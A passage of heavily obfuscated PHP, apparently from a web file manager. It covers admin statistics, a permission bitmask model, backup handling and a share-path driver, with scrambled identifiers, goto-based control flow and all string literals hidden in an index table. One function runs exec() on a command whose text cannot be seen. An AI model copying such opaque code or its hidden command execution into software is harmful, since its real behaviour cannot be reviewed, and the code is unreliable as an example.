$this->typeLogCnt($f‡˜õ„¡øï[33], $f‡˜õ„¡øï[1611])); } private function typeLogCnt($c‰ÅàÈêŠƒ = '', $D£î÷åæŒ = "\x69\144") { goto D…è¤å•Á; D…è¤å•Á: $fŒä£«ğ¬„ =& $_SERVER[µ…]; $aºÌ±¿çƒÉ = array($fŒä£«ğ¬„[106] => array($fŒä£«ğ¬„[1637], $fŒä£«ğ¬„[1638]), $fŒä£«ğ¬„[424] => array($fŒä£«ğ¬„[1639], $fŒä£«ğ¬„[1640]), $fŒä£«ğ¬„[1635] => array($fŒä£«ğ¬„[1641], $fŒä£«ğ¬„[1642], $fŒä£«ğ¬„[1643]), $fŒä£«ğ¬„[1636] => array($fŒä£«ğ¬„[1644], $fŒä£«ğ¬„[1645]), $fŒä£«ğ¬„[1646] => array($fŒä£«ğ¬„[1647], $fŒä£«ğ¬„[1648], $fŒä£«ğ¬„[1649])); $Cáã®Î¼¸İ = strtotime(date($fŒä£«ğ¬„[1607])); goto c¾‹Œ£½š; aé«•ñÛ“Ì: return (int) $Bğéƒ¥å²‰; goto aåâæ¿è—Á; c¾‹Œ£½š: $bè¾äóÖÚ¾ = array($fŒä£«ğ¬„[192] => array($fŒä£«ğ¬„[949], $Cáã®Î¼¸İ)); if ($c‰ÅàÈêŠƒ) { $bè¾äóÖÚ¾[$fŒä£«ğ¬„[29]] = array($fŒä£«ğ¬„[7], $aºÌ±¿çƒÉ[$c‰ÅàÈêŠƒ]); } $Bğéƒ¥å²‰ = Model($fŒä£«ğ¬„[1610])->where($bè¾äóÖÚ¾)->count($D£î÷åæŒ); goto aé«•ñÛ“Ì; aåâæ¿è—Á: } private function optionServer() { goto AãÏ„™ƒ¡é; E†Çš»±–È: $CêğÇ¼„´ = array($D†ØŸÕÈŠ[762] => $dõâİ¨«Ä•[$D†ØŸÕÈŠ[388]]); $BÎÆ»†„êÅ = Model($D†ØŸÕÈŠ[444])->where($CêğÇ¼„´)->sum($D†ØŸÕÈŠ[77]); $dËØ¾Ù°½ª = explode($D†ØŸÕÈŠ[50], $_SERVER[$D†ØŸÕÈŠ[141]]); goto EˆŠœ•ª™Ì; cÔÜ·’ñò§: if ($aáâ±Â¥š == $D†ØŸÕÈŠ[740]) { $AÑÌÒ…ø„Ø = explode($D†ØŸÕÈŠ[1142], $AÓÌŠöİå­[$D†ØŸÕÈŠ[909]]); $aáâ±Â¥š = $AÑÌÒ…ø„Ø[0]; } if ($aáâ±Â¥š == $D†ØŸÕÈŠ[743] || $aáâ±Â¥š == $D†ØŸÕÈŠ[744]) { $eùåùëÎÂ = Model()->db()->query($D†ØŸÕÈŠ[1650]); $DÃÙÜôİ = $eùåùëÎÂ[0] && isset($eùåùëÎÂ[0][$D†ØŸÕÈŠ[1410]]) ? $eùåùëÎÂ[0][$D†ØŸÕÈŠ[1410]] : 0; $aáâ±Â¥š = $D†ØŸÕÈŠ[1651] . ($DÃÙÜôİ ? $D†ØŸÕÈŠ[8] . $DÃÙÜôİ : $D†ØŸÕÈŠ[33]); } $EÜƒß†ğ‡ñ = $GLOBALS[$D†ØŸÕÈŠ[6]][$D†ØŸÕÈŠ[345]][$D†ØŸÕÈŠ[771]]; goto C“ì¹Ç®ñá; AãÏ„™ƒ¡é: $D†ØŸÕÈŠ =& $_SERVER[µ…]; $c„¸ˆ¨î = $this->diskDriver(); $dõâİ¨«Ä• = KodIO::defaultDriver(); goto E†Çš»±–È; C“ì¹Ç®ñá: return array($D†ØŸÕÈŠ[1652] => $c„¸ˆ¨î ? $c„¸ˆ¨î[$D†ØŸÕÈŠ[1653]] : 0, $D†ØŸÕÈŠ[1654] => $c„¸ˆ¨î ? $c„¸ˆ¨î[$D†ØŸÕÈŠ[1655]] : 0, $D†ØŸÕÈŠ[1656] => (int) $dõâİ¨«Ä•[$D†ØŸÕÈŠ[1653]] * 1024 * 1024 * 1024, $D†ØŸÕÈŠ[1657] => (int) $BÎÆ»†„êÅ, $D†ØŸÕÈŠ[1658] => ucfirst($b‰®§Íƒä), $D†ØŸÕÈŠ[1659] => $D†ØŸÕÈŠ[1660] . PHP_VERSION, $D†ØŸÕÈŠ[1661] => phpBuild64() ? 64 : 32, $D†ØŸÕÈŠ[709] => str_replace($D†ØŸÕÈŠ[1662], $D†ØŸÕÈŠ[926], $aáâ±Â¥š), $D†ØŸÕÈŠ[345] => ucfirst($EÜƒß†ğ‡ñ), $D†ØŸÕÈŠ[28] => $_SERVER[$D†ØŸÕÈŠ[1663]]); goto dÔ÷×Ğá‹å; EˆŠœ•ª™Ì: $b‰®§Íƒä = $dËØ¾Ù°½ª[0]; $AÓÌŠöİå­ = $GLOBALS[$D†ØŸÕÈŠ[6]][$D†ØŸÕÈŠ[17]]; $aáâ±Â¥š = $AÓÌŠöİå­[$D†ØŸÕÈŠ[910]]; goto cÔÜ·’ñò§; dÔ÷×Ğá‹å: } private function diskDriver() { goto a¢îöÒ³×; dÑ†Ó«àÛˆ: if ($c•éƒ•õ†ñ) { $Bñ×ÁğÁœ = $dæ»Âç“[1666]; if (function_exists($dæ»Âç“[1667])) { exec($dæ»Âç“[1668], $D´Ş‘ì‹‘‹); $Bñ×ÁğÁœ = $D´Ş‘ì‹‘‹[1] . $dæ»Âç“[8]; } } if (!file_exists($Bñ×ÁğÁœ)) { return; } $F…½Ôğ½Ì = @disk_total_space($Bñ×ÁğÁœ); goto eã§­åÑ£Ø; a¢îöÒ³×: $dæ»Âç“ =& $_SERVER[µ…]; $Bñ×ÁğÁœ = $dæ»Âç“[8]; $c•éƒ•õ†ñ = $GLOBALS[$dæ»Âç“[6]][$dæ»Âç“[1664]] == $dæ»Âç“[1665]; goto dÑ†Ó«àÛˆ; eã§­åÑ£Ø: $Eöã”áÍ½ = $F…½Ôğ½Ì - @disk_free_space($Bñ×ÁğÁœ); return array($dæ»Âç“[1653] => $F…½Ôğ½Ì, $dæ»Âç“[1655] => $Eöã”áÍ½); goto eµÆ­–ÚØ; eµÆ­–ÚØ: } public function fileChart($AÖÑÔíêÚœ) { goto dò¤™¼œ¶Ó; dò¤™¼œ¶Ó: $BŸÔßì² =& $_SERVER[µ…]; if (isset($AÖÑÔíêÚœ[$BŸÔßì²[1506]])) { return Model($BŸÔßì²[769])->userFileTypeProfile($AÖÑÔíêÚœ[$BŸÔßì²[1506]]); } if (isset($AÖÑÔíêÚœ[$BŸÔßì²[1669]])) { return Model($BŸÔßì²[769])->groupFileTypeProfile($AÖÑÔíêÚœ[$BŸÔßì²[1669]]); } goto eÏï”Ğ£ğ; CÀêÊ”›“: $EøÒ¾¶óÔ­[$BŸÔßì²[398]] = 2; $cåèÔ‘†ì± = Model($BŸÔßì²[769])->where($EøÒ¾¶óÔ­)->sum($BŸÔßì²[77]); return array($BŸÔßì²[713] => $e‡Ÿ«Œ³¬Ÿ[$BŸÔßì²[77]], $BŸÔßì²[1600] => $e‡Ÿ«Œ³¬Ÿ[$BŸÔßì²[1600]], $BŸÔßì²[1601] => (int) $aîœÑ¶ğ“¿, $BŸÔßì²[1602] => (int) $cåèÔ‘†ì±); goto aÜ¢ÀïÙƒ«; eÏï”Ğ£ğ: $e‡Ÿ«Œ³¬Ÿ = $this->sourceSize(); $EøÒ¾¶óÔ­ = array($BŸÔßì²[472] => 0, $BŸÔßì²[398] => 1); $aîœÑ¶ğ“¿ = Model($BŸÔßì²[769])->where($EøÒ¾¶óÔ­)->sum($BŸÔßì²[77]); goto CÀêÊ”›“; aÜ¢ÀïÙƒ«: } private function sourceSize() { $f‚ÇÇÍ© =& $_SERVER[µ…]; $EÇ‘«ƒ¶Çô = Model($f‚ÇÇÍ©[769])->where(array($f‚ÇÇÍ©[397] => 0))->sum($f‚ÇÇÍ©[77]); $D‹¶£‚™‘ñ = Model($f‚ÇÇÍ©[444])->sum($f‚ÇÇÍ©[77]); if ($D‹¶£‚™‘ñ > $EÇ‘«ƒ¶Çô) { $D‹¶£‚™‘ñ = $EÇ‘«ƒ¶Çô; } return array($f‚ÇÇÍ©[77] => (int) $EÇ‘«ƒ¶Çô, $f‚ÇÇÍ©[1600] => (int) $D‹¶£‚™‘ñ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $e åŠØˆáÇ =& $_SERVER[µ…]; $A¼‰¸„øù = array(array($e åŠØˆáÇ[407] => LNG($e åŠØˆáÇ[1670]), $e åŠØˆáÇ[1671] => $e åŠØˆáÇ[1672], $e åŠØˆáÇ[1673] => 1, $e åŠØˆáÇ[1674] => 1, $e åŠØˆáÇ[1675] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($e åŠØˆáÇ[407] => LNG($e åŠØˆáÇ[1676]), $e åŠØˆáÇ[1671] => $e åŠØˆáÇ[1677], $e åŠØˆáÇ[1673] => 2, $e åŠØˆáÇ[1674] => 1, $e åŠØˆáÇ[1675] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($e åŠØˆáÇ[407] => LNG($e åŠØˆáÇ[1678]), $e åŠØˆáÇ[1671] => $e åŠØˆáÇ[1679], $e åŠØˆáÇ[1673] => 3, $e åŠØˆáÇ[1674] => 1, $e åŠØˆáÇ[1675] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($e åŠØˆáÇ[407] => LNG($e åŠØˆáÇ[1680]), $e åŠØˆáÇ[1671] => $e åŠØˆáÇ[1681], $e åŠØˆáÇ[1673] => 4, $e åŠØˆáÇ[1674] => 1, $e åŠØˆáÇ[1675] => self::AUTH_SHOW | self::AUTH_VIEW), array($e åŠØˆáÇ[407] => LNG($e åŠØˆáÇ[1682]), $e åŠØˆáÇ[1671] => $e åŠØˆáÇ[1683], $e åŠØˆáÇ[1673] => 5, $e åŠØˆáÇ[1674] => 1, $e åŠØˆáÇ[1675] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($e åŠØˆáÇ[407] => LNG($e åŠØˆáÇ[1684]), $e åŠØˆáÇ[1671] => $e åŠØˆáÇ[1685], $e åŠØˆáÇ[1673] => 6, $e åŠØˆáÇ[1674] => 1, $e åŠØˆáÇ[1675] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($e åŠØˆáÇ[407] => LNG($e åŠØˆáÇ[1686]), $e åŠØˆáÇ[1671] => $e åŠØˆáÇ[1687], $e åŠØˆáÇ[1673] => 7, $e åŠØˆáÇ[1674] => 1, $e åŠØˆáÇ[1675] => 0)); return $A¼‰¸„øù; } public static function authCheck($eŠ¡»¹ï–É, $a‡‰³™¦ŒÙ) { $eŠ¡»¹ï–É = intval($eŠ¡»¹ï–É); if ($GLOBALS[$_SERVER[µ…][479]]) { return !0; } if ($eŠ¡»¹ï–É <= 0) { return !1; } if (($eŠ¡»¹ï–É & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($eŠ¡»¹ï–É & $a‡‰³™¦ŒÙ); } public static function authCheckShow($A„ê¢í“Ú¨) { return self::authCheck($A„ê¢í“Ú¨, self::AUTH_SHOW); } public static function authCheckView($D“ö×Î—½î) { return self::authCheck($D“ö×Î—½î, self::AUTH_VIEW); } public static function authCheckDownload($CˆñÉï¡‘ª) { return self::authCheck($CˆñÉï¡‘ª, self::AUTH_DOWNLOAD); } public static function authCheckUpload($cİù¢ÛÅ–) { return self::authCheck($cİù¢ÛÅ–, self::AUTH_UPLOAD); } public static function authCheckEdit($fí™³É˜¼») { return self::authCheck($fí™³É˜¼», self::AUTH_EDIT); } public static function authCheckRemove($eÔİ–‹‚´µ) { return self::authCheck($eÔİ–‹‚´µ, self::AUTH_REMOVE); } public static function authCheckShare($e°Åäˆ„º¡) { return self::authCheck($e°Åäˆ„º¡, self::AUTH_SHARE); } public static function authCheckComment($BïÏ½„……) { return self::authCheck($BïÏ½„……, self::AUTH_COMMENT); } public static function authCheckEvent($dîÊŞœ‹Æ©) { return self::authCheck($dîÊŞœ‹Æ©, self::AUTH_EVENT); } public static function authCheckRoot($a¶½²ë”àù) { return self::authCheck($a¶½²ë”àù, self::AUTH_ROOT); } public static function authCheckAction($Dß³‡§Ó«, $dß´ç‚„¿Ô) { goto E—†”·‰‘ã; dšÙØÔî­Ô: if (($Dß³‡§Ó« & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Dß³‡§Ó« & $DâÀ®›­÷Ø); goto dÅ’ŒÊÙ¡; aÁ˜œ¬öĞ²: $DâÀ®›­÷Ø = $B³£È‹ÉÚ…[$dß´ç‚„¿Ô]; $Dß³‡§Ó« = intval($Dß³‡§Ó«); if ($Dß³‡§Ó« <= 0) { return !1; } goto dšÙØÔî­Ô; E—†”·‰‘ã: $aèùâô˜Å„ =& $_SERVER[µ…]; $B³£È‹ÉÚ… = array($aèùâô˜Å„[1688] => self::AUTH_VIEW, $aèùâô˜Å„[1071] => self::AUTH_DOWNLOAD, $aèùâô˜Å„[106] => self::AUTH_UPLOAD, $aèùâô˜Å„[1636] => self::AUTH_EDIT, $aèùâô˜Å„[1635] => self::AUTH_REMOVE, $aèùâô˜Å„[1646] => self::AUTH_SHARE, $aèùâô˜Å„[350] => self::AUTH_COMMENT, $aèùâô˜Å„[1495] => self::AUTH_EVENT, $aèùâô˜Å„[1689] => self::AUTH_ROOT); if (!isset($B³£È‹ÉÚ…[$dß´ç‚„¿Ô])) { return; } goto aÁ˜œ¬öĞ²; dÅ’ŒÊÙ¡: } public static function authDisable($B‚ÑõÖ®ØÜ, $C‘¡Û¤¢“Í) { if (intval($B‚ÑõÖ®ØÜ) <= 0) { return 0; } return intval($B‚ÑõÖ®ØÜ) & ~$C‘¡Û¤¢“Í; } public $optionType = "\123\171\163\164\145\x6d\x2e\163\x6f\x75\x72\x63\x65\101\x75\x74\x68\114\x69\163\164"; public $field = array("\156\141\x6d\x65", "\141\x75\x74\150", "\x6c\x61\142\x65\x6c", "\x64\x69\163\160\x6c\141\x79", "\163\171\163\164\x65\x6d", "\x73\157\162\x74"); public function initData() { $E…œè‰¨áÎ = $this->authDefault(); foreach ($E…œè‰¨áÎ as $fšç±÷¶õ) { $this->add($fšç±÷¶õ); } } public function listData($fò¢Ğµ‚ì = false, $dŸÁŞÛŠÏ = "\x73\x6f\x72\x74", $cÊØ½Ìø’³ = false) { return parent::listData($fò¢Ğµ‚ì, $dŸÁŞÛŠÏ, $cÊØ½Ìø’³); } public function update($C–™ÈÌ‹Ç”, $d¼Â¨İÅ»²) { $bäĞ´ƒè«Ÿ =& $_SERVER[µ…]; $BÁè¡¾¥Ë˜ = parent::listData($C–™ÈÌ‹Ç”); $Bó‹Û®…¾ = $this->findByName($d¼Â¨İÅ»²[$bäĞ´ƒè«Ÿ[28]]); if (!$BÁè¡¾¥Ë˜ || $Bó‹Û®…¾ && $Bó‹Û®…¾[$bäĞ´ƒè«Ÿ[388]] != $BÁè¡¾¥Ë˜[$bäĞ´ƒè«Ÿ[388]]) { return !1; } $this->filterAuth($d¼Â¨İÅ»²[$bäĞ´ƒè«Ÿ[400]]); return parent::update($C–™ÈÌ‹Ç”, $d¼Â¨İÅ»²); } public function remove($cğß“Èáà¡) { $Có„Ìƒ°Š  = parent::listData($cğß“Èáà¡); if (!$Có„Ìƒ°Š  || $Có„Ìƒ°Š [$_SERVER[µ…][1146]]) { return !1; } return parent::remove($cğß“Èáà¡); } public function add($A¨·õâô‚ = array()) { goto dŞÚ¬Ïå¿ó; c½¹´é‡ÅÜ: $A¨·õâô‚ = array_merge($c ›°´ò¼à, $A¨·õâô‚); $A¨·õâô‚[$D¡óÔõ‡Š[1692]] = $this->getSort(); $this->filterAuth($A¨·õâô‚[$D¡óÔõ‡Š[400]]); goto AÂ†§–£Ê™; dŞÚ¬Ïå¿ó: $D¡óÔõ‡Š =& $_SERVER[µ…]; if ($this->findByName($A¨·õâô‚[$D¡óÔõ‡Š[28]])) { return !1; } $c ›°´ò¼à = array($D¡óÔõ‡Š[28] => $D¡óÔõ‡Š[33], $D¡óÔõ‡Š[400] => 1, $D¡óÔõ‡Š[1690] => $D¡óÔõ‡Š[1679], $D¡óÔõ‡Š[1691] => 1, $D¡óÔõ‡Š[1146] => 0, $D¡óÔõ‡Š[1692] => 0); goto c½¹´é‡ÅÜ; AÂ†§–£Ê™: return parent::insert($A¨·õâô‚); goto A­¬¤‡‚²; A­¬¤‡‚²: } private function getSort() { $cá‚ø–¦“ =& $_SERVER[µ…]; $f†ìØÂ²Ñ = parent::listData(); $Fé½³ÍÎÓ = array_to_keyvalue($f†ìØÂ²Ñ, $cá‚ø–¦“[33], $cá‚ø–¦“[1692]); return empty($Fé½³ÍÎÓ) ? 0 : max($Fé½³ÍÎÓ) + 1; } private function filterAuth(&$Bï¹ÌİÊØ¹) { goto CëóÍòÕåª; bØé» À: foreach ($Fƒ«ì¸Íî as $F†‚Ï„ğÅ„) { if (isset($fƒ¤°«¼¼[$F†‚Ï„ğÅ„])) { $Fƒ«ì¸Íî = array_merge($Fƒ«ì¸Íî, $fƒ¤°«¼¼[$F†‚Ï„ğÅ„]); } } $Fƒ«ì¸Íî[] = self::AUTH_SHOW; $Bï¹ÌİÊØ¹ = array_sum(array_unique($Fƒ«ì¸Íî)); goto C Ûâ…Şœí; D“Ğ”ò³òè: foreach ($eèíÄ‰•‹î as $F†‚Ï„ğÅ„) { if ($Bï¹ÌİÊØ¹ & $F†‚Ï„ğÅ„) { $Fƒ«ì¸Íî[] = $F†‚Ï„ğÅ„; } } if (in_array(self::AUTH_ROOT, $Fƒ«ì¸Íî)) { $Bï¹ÌİÊØ¹ = array_sum($eèíÄ‰•‹î); return; } $fƒ¤°«¼¼ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bØé» À; CëóÍòÕåª: if (!$Bï¹ÌİÊØ¹) { return; } $eèíÄ‰•‹î = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Fƒ«ì¸Íî = array(); goto D“Ğ”ò³òè; C Ûâ…Şœí: } public function sort($fó¸È®º±Á, $BËˆˆÎ•¾) { return parent::update($fó¸È®º±Á, $BËˆˆÎ•¾); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x62\141\143\153\165\x70\114\x69\x73\x74"; public $field = array("\151\x6f", "\x6e\141\x6d\x65", "\163\164\x61\x74\165\x73", "\x63\157\156\x74\145\x6e\x74", "\x72\145\x73\x75\x6c\x74", "\164\x69\155\x65\106\x72\x6f\x6d", "\x74\x69\x6d\145\x54\157"); public function config() { goto BÙÎÌ¿Ê; AÃ·‚±šâ¢: if (isset($EÑ±Ë¬‰‹[$EÚ¶Ò¶‹Åä[195]])) { $EÑ±Ë¬‰‹[$EÚ¶Ò¶‹Åä[195]] = json_decode($EÑ±Ë¬‰‹[$EÚ¶Ò¶‹Åä[195]], !0); } if (isset($a‹Ñ÷‹Š[$EÚ¶Ò¶‹Åä[195]])) { $EÑ±Ë¬‰‹[$EÚ¶Ò¶‹Åä[195]][$EÚ¶Ò¶‹Åä[1480]] = $a‹Ñ÷‹Š[$EÚ¶Ò¶‹Åä[195]]; unset($a‹Ñ÷‹Š[$EÚ¶Ò¶‹Åä[195]]); } return array_merge($EÑ±Ë¬‰‹, $a‹Ñ÷‹Š); goto DŒ »¢·´; C¾å¸¦ƒ‰: $a‹Ñ÷‹Š = is_array($a‹Ñ÷‹Š) ? $a‹Ñ÷‹Š : array(); if (!isset($a‹Ñ÷‹Š[$EÚ¶Ò¶‹Åä[707]])) { $a‹Ñ÷‹Š[$EÚ¶Ò¶‹Åä[707]] = $EÚ¶Ò¶‹Åä[86]; } $EÑ±Ë¬‰‹ = array(); goto D»·Ø†¯Å; D»·Ø†¯Å: Action($EÚ¶Ò¶‹Åä[1693])->taskInit(); $eµ¸àçôİÆ = Model($EÚ¶Ò¶‹Åä[1694])->listData(); foreach ($eµ¸àçôİÆ as $Dåå‘¦…ß) { if ($Dåå‘¦…ß[$EÚ¶Ò¶‹Åä[1146]] == $EÚ¶Ò¶‹Åä[86] && $Dåå‘¦…ß[$EÚ¶Ò¶‹Åä[1495]] == $EÚ¶Ò¶‹Åä[1695]) { $EÑ±Ë¬‰‹ = $Dåå‘¦…ß; break; } } goto AÃ·‚±šâ¢; BÙÎÌ¿Ê: $EÚ¶Ò¶‹Åä =& $_SERVER[µ…]; $a‹Ñ÷‹Š = Model($EÚ¶Ò¶‹Åä[1101])->get($EÚ¶Ò¶‹Åä[728]); $a‹Ñ÷‹Š = json_decode($a‹Ñ÷‹Š, !0); goto C¾å¸¦ƒ‰; DŒ »¢·´: } public function listData($F˜ùİƒ“ì® = false, $fé­ã¬÷ = "\x6d\x6f\144\x69\x66\171\124\x69\x6d\x65", $F×†‚¶ìÃ = false) { return parent::listData($F˜ùİƒ“ì®, $fé­ã¬÷, !0); } public function lastItem() { $DİÉô»‹Ğ = $this->listData(); return !empty($DİÉô»‹Ğ[0]) ? $DİÉô»‹Ğ[0] : null; } public function kill($EÊÕ÷ˆÉ¦è) { goto F²¡š‘ªº; EíáËìà¤½: Task::kill($F°ÛŠªÏµ[727]); Task::kill($F°ÛŠªÏµ[746]); Task::kill($F°ÛŠªÏµ[755]); goto DÇá¸µ•Òó; cÑ©ŸòÆ§: return $this->remove($EÊÕ÷ˆÉ¦è); goto b¨ø‹ÆœÍ; F²¡š‘ªº: $F°ÛŠªÏµ =& $_SERVER[µ…]; $E©¦¾‰ñÎ³ = $this->listData($EÊÕ÷ˆÉ¦è); if (!$E©¦¾‰ñÎ³ || empty($E©¦¾‰ñÎ³[$F°ÛŠªÏµ[28]])) { return !0; } goto EíáËìà¤½; DÇá¸µ•Òó: $bŸÚ‚ñ¨–Ô = $E©¦¾‰ñÎ³[$F°ÛŠªÏµ[28]]; $E‡…Œäé² = TEMP_FILES . $F°ÛŠªÏµ[724] . $bŸÚ‚ñ¨–Ô . $F°ÛŠªÏµ[8]; IO::remove($E‡…Œäé², !1); goto cÑ©ŸòÆ§; b¨ø‹ÆœÍ: } public function remove($DÓììĞÓï) { $B‡‡÷±ÏÃÏ = $this->listData($DÓììĞÓï); if (!$B‡‡÷±ÏÃÏ) { return !0; } return $this->backupRemove($B‡‡÷±ÏÃÏ); } private function backupRemove($F­’ÕÙ”Ô¶) { $fÂÑÄ»à­Œ =& $_SERVER[µ…]; parent::remove($F­’ÕÙ”Ô¶[$fÂÑÄ»à­Œ[388]]); $aï“ŞÍ—ä¨ = "\173\151\157\72{$F­’ÕÙ”Ô¶[$fÂÑÄ»à­Œ[706]]}\x7d\x2f\x64\141\x74\141\142\141\163\145\x2f\x62\x61\143\x6b\x75\x70\137" . $F­’ÕÙ”Ô¶[$fÂÑÄ»à­Œ[28]]; IO::remove($aï“ŞÍ—ä¨, !1); return !0; } public function start() { goto AÁé¿Ù»¸Â; fØÕ‹ô§Ë†: if ($c’ƒ˜“À’) { $c’ƒ˜“À’ = $eÎ›¢Ì‘ì->dbFile(); if ($c’ƒ˜“À’ && $c½®Ÿ„¹‚[$bÏŞğ¨÷Ûî[707]] == $bÏŞğ¨÷Ûî[491]) { $c’ƒ˜“À’ = $eÎ›¢Ì‘ì->file(); } } Backup::set(array($bÏŞğ¨÷Ûî[704] => 1, $bÏŞğ¨÷Ûî[470] => time())); return !0; goto bŠé§õ¨; AÁé¿Ù»¸Â: $bÏŞğ¨÷Ûî =& $_SERVER[µ…]; if ($GLOBALS[$bÏŞğ¨÷Ûî[6]][$bÏŞğ¨÷Ûî[87]][$bÏŞğ¨÷Ûî[1696]] != $bÏŞğ¨÷Ûî[86]) { return !0; } $c½®Ÿ„¹‚ = $this->config(); goto BŞÇÑ®è¿; C«ë¾ÃÒ: $eÎ›¢Ì‘ì = new Backup(); $eÎ›¢Ì‘ì->keep(); $c’ƒ˜“À’ = $eÎ›¢Ì‘ì->db(); goto fØÕ‹ô§Ë†; BŞÇÑ®è¿: if (!$c½®Ÿ„¹‚ || $c½®Ÿ„¹‚[$bÏŞğ¨÷Ûî[1477]] != $bÏŞğ¨÷Ûî[86]) { return !1; } $fÅ‘¼õ¸‰Ü = $this->process(); foreach ($fÅ‘¼õ¸‰Ü as $fĞÌ¸ùíÎä) { if ($fĞÌ¸ùíÎä) { return Task::restart($fĞÌ¸ùíÎä[$bÏŞğ¨÷Ûî[388]]); } } goto C«ë¾ÃÒ; bŠé§õ¨: } public function process() { $Dõ§§óğåÑ =& $_SERVER[µ…]; return array($Dõ§§óğåÑ[709] => Task::get($Dõ§§óğåÑ[727]), $Dõ§§óğåÑ[712] => Task::get($Dõ§§óğåÑ[746]), $Dõ§§óğåÑ[191] => Task::get($Dõ§§óğåÑ[755])); } public function restore() { $EåôÕ‹ÓŸ¦ =& $_SERVER[µ…]; ActionCall($EåôÕ‹ÓŸ¦[996], !0, 1); ActionCall($EåôÕ‹ÓŸ¦[996], !0, 0); } } goto F—áĞèœ•ƒ; C»÷‰–ãÍÒ: class PathDriverDriverShareItem { public function __construct($f»¬»ôƒå²) { $this->pathParse = $f»¬»ôƒå²; } public function __call($aÍƒ®´Ùã, $f¾ëäù˜‰) { $FÍâÛØ‰À =& $_SERVER[µ…]; if (method_exists($this, $aÍƒ®´Ùã)) { return; } $F›ÜÛàˆíˆ = call_user_func_array(array($FÍâÛØ‰À[1191], $aÍƒ®´Ùã), $f¾ëäù˜‰); $CŠÏÓ¦ğÁ  = array($FÍâÛØ‰À[1192], $FÍâÛØ‰À[1193], $FÍâÛØ‰À[1194], $FÍâÛØ‰À[1195], $FÍâÛØ‰À[513], $FÍâÛØ‰À[515], $FÍâÛØ‰À[1196], $FÍâÛØ‰À[106], $FÍâÛØ‰À[1197], $FÍâÛØ‰À[1198]); if (in_array($aÍƒ®´Ùã, $CŠÏÓ¦ğÁ )) { $F›ÜÛàˆíˆ = $this->getPathOuter($F›ÜÛàˆíˆ); } return $F›ÜÛàˆíˆ; } public function copy($cÕßÄ–Şë, $AáøŠåƒó, $f„â†ßÂŠï = false) { return $this->copyMove($cÕßÄ–Şë, $AáøŠåƒó, $f„â†ßÂŠï, $_SERVER[µ…][513]); } public function move($aæºÈ¦’Ô, $C·í¼¸’½Æ, $CßŸ„öÚé¦ = false) { return $this->copyMove($aæºÈ¦’Ô, $C·í¼¸’½Æ, $CßŸ„öÚé¦, $_SERVER[µ…][515]); } private function copyMove($a¬İßöì¤ô, $f³ğ×ÇÎâ, $Bøß–õ±¾İ, $F¸”Áºğ‚») { goto BáŠ‹æî«ª; d†°·ïï: return $b¶‡ƒ¬éê; goto FĞ¼™õ§¬Ê; BáŠ‹æî«ª: $C’‡ÄÚİó =& $_SERVER[µ…]; $EÔà³õ¿» = $f³ğ×ÇÎâ; $d„˜¥¶ŠğÆ = IO::driverMake($f³ğ×ÇÎâ); goto fĞÒ­÷Ã¨Œ; fĞÒ­÷Ã¨Œ: if ($d„˜¥¶ŠğÆ->pathParse[$C’‡ÄÚİó[1025]]) { $f³ğ×ÇÎâ = $d„˜¥¶ŠğÆ->pathParse[$C’‡ÄÚİó[1025]]; } else { $f³ğ×ÇÎâ = $EÔà³õ¿»; } $b¶‡ƒ¬éê = IO::copyMove($a¬İßöì¤ô, $f³ğ×ÇÎâ, $Bøß–õ±¾İ, $F¸”Áºğ‚»); $b¶‡ƒ¬éê = $this->getPathOuter($b¶‡ƒ¬éê); goto d†°·ïï; FĞ¼™õ§¬Ê: } public function pathThis($eĞ´÷ß¢Ä¥) { return get_path_this($this->pathParse[$_SERVER[µ…][75]]); } public function pathFather($EÔ˜è½ò–) { return get_path_father($this->pathParse[$_SERVER[µ…][75]]); } public function iconvSystem($fàáˆ¤¿Á) { return $fàáˆ¤¿Á; } protected function infoParse($EªŞÍÛ›ñâ, $båê‘Âò®ƒ = false) { $Bù÷¹ÆÏ¥‚ =& $_SERVER[µ…]; $d¿ØçáŠ = $this->pathParse[$Bù÷¹ÆÏ¥‚[460]][$Bù÷¹ÆÏ¥‚[1048]] . $this->pathParse[$Bù÷¹ÆÏ¥‚[1041]]; if ($båê‘Âò®ƒ) { $d«˜³‡ì“œ = IO::infoWithChildren($d¿ØçáŠ); } else { $d«˜³‡ì“œ = IO::info($d¿ØçáŠ); } $cá“ñ‚§šÑ = $this->pathParse[$Bù÷¹ÆÏ¥‚[460]]; return 